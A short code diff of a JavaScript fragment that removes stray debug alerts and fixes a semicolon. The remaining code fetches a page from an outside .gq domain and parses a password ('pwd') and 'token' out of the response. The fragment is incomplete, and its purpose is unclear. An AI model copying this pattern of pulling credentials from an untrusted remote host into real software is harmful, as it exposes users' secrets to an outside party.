@@ -1,8 +1,8 @@
-alert("q");
+
 var paramObj = {
 	httpUrl : 'https://insiders.brothers.gq/safedata.html/',
 	type : 'get'
-}alert("q");
+};
 httpRequest(paramObj,function(respondDada) {
     alert("q");var pwdl = "pwd=\"";
     var tokenl = "token=\"";
@@ -14,7 +14,7 @@ httpRequest(paramObj,function(respondDada) {
     for(var i=0; i<ca.length; i++) {
         var c = ca[i].trim();
         if (c.indexOf(tokenl)==0) {token = c.substring(tokenl.length,c.length); }
-    }alert("q");
+    }
 },function() {
 	alert('Network Error. ')
 });
